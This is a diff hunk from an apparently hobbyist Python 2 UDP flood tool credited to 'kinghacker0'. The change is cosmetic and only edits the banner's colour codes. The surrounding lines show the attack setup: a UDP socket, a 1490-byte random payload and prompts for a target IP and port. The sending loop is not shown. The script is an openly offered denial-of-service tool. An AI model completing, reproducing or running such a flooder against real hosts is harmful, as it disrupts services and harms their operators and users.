@@ -18,15 +18,15 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 #Banner Start
-print "\033[1;31;40m ___/__ \______ ___ / /____/ /_\033[1;40m31;40m"
-print "\033[1;40m31;40m __  /_/ /_  __ `/_  __/__  __ |\033[1;40m31;40m"
-print "\033[1;40m31;40m _  _, _/ / /_/ / / /_  _  / / /\033[1;40m31;40m"
-print "\033[1;40m31;40m /_/ |_|  \__,_/  \__/  /_/ /_/ \033[1;40m31;40m"
+print "\033[1;40m___/__ \______ ___ / /____/ /_\033[1;40m"
+print "\033[1;40m__  /_/ /_  __ `/_  __/__  __ |\033[1;40m"
+print "\033[1;40m_  _, _/ / /_/ / / /_  _  / / /\033[1;40m"
+print "\033[1;40m/_/ |_|  \__,_/  \__/  /_/ /_/ \033[1;40m"
 
 #Banner End
-print "\033[1;40m31;40m Author    : kinghacker0\033[1;40m31;40m "
-print "\033[1;40m31;40m Github    : https://github.com/kinghacker0\033[1;40m31;40m "
-print "\033[1;40m31;40m Instagram : https://www.instagram.com/kinghacker0\033[1;40m31;40m"
+print "\033[1;40mAuthor    : kinghacker0\033[1;40m "
+print "\033[1;40mGithub    : https://github.com/kinghacker0\033[1;40m "
+print "\033[1;40mInstagram : https://www.instagram.com/kinghacker0\033[1;40m"
 print     
 ip = raw_input("[*]Enter Target Ip : ")
 port = int(raw_input("[*]Enter Target Port : "))
